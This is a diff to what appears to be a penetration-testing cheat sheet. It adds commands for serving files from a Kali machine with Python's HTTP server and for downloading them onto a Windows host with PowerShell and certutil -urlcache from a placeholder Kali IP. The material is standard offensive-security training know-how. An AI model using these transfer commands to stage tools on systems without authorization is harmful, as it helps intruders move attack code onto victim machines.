@@ -22,15 +22,23 @@ dir
 cd <path>
 sudo python -m SimpleHTTPServer 80
 ```
+or
+```
+cd <path>
+sudo python3 -m http.server 80
+```
 
-### download from Windows
+### download to Windows
 
 Powershell
 ```
 Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
 ```
 
-
+Certutil
+```
+certutil -urlcache -f 'http://<Kali IP>/<filename>' <filename>
+```
 
 
 
